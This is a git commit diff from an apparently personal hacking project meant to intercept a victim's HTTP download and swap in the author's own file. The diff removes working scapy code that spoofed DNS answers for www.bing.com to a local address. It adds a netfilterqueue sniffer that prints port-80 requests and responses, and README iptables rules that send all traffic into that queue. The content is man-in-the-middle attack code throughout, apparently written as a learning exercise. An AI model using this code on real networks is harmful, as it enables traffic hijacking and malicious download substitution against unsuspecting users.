511e04d5c98b7a73a695040d3ff7c3bef0042c7b
kali <hackenstance@proton.me>
2026-04-10 09:35:39 -0500

    Filter for port 80 response and requests

--- README.md
+++ README.md
@@ -1,10 +1,9 @@
 <h3>REPLACE DOWNLOAD</h3>
 <h4>Intercept a download and replace it with my own file.</h4>
 <h4>I guess it will work locally but let's see remote</h4>
-<p></p>
-<h4></h4>
-<p></p>
-<p></p>
+<h4>Create iptables queue for input and output</h4>
+<p>iptables -I INPUT -j NFQUEUE --queue-num 0</p>
+<p>iptables -I OUTPUT -j NFQUEUE --queue-num 0</p>
 <ol>
 <li><b></b>:</li>
 <li><b></b>:</li>
--- main.py
+++ main.py
@@ -1,31 +1,25 @@
 #!/usr/bin/env python3
 import netfilterqueue
-from scapy.layers.inet import IP
-from scapy.layers.dns import DNSRR, DNSQR, DNS, UDP
-
-target_ip_vm = " 192.168.63.174"
-target_interface_vm = "Ethernet0"
+from scapy.layers.inet import IP, TCP
+from scapy.layers.dns import Raw
 
 def process_packet(packet):
     scapy_packet= IP(packet.get_payload())
-    if scapy_packet.haslayer(DNSRR):
-        qname = scapy_packet[DNSQR].qname
-        if b"www.bing.com" in qname:
-            print("[+] Spoofing Target", end=" ")
-            answer = DNSRR(rrname=qname, rdata="192.168.63.139")
-            scapy_packet[DNS].an = answer
-            scapy_packet[DNS].ancount = 1
-            del scapy_packet[IP].len
-            del scapy_packet[IP].chksum
-            if scapy_packet.haslayer(UDP):
-                del scapy_packet[UDP].len
-                del scapy_packet[UDP].chksum
-            packet.set_payload(bytes(scapy_packet))
+    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
+        print("Packet has Raw and TCP layers.")
+        if scapy_packet[TCP].dport == 80:
+            print("HTTP Request: ")
+            print(scapy_packet.show())
+        elif scapy_packet[TCP].sport == 80:
+            print("HTTP Response: ")
+            print(scapy_packet.show())
 
     packet.accept()
+    return None # suppress excess packets being printed.
 
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
-queue.run()
+if __name__ == "__main__":
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(0, process_packet)
+    queue.run()
 
 
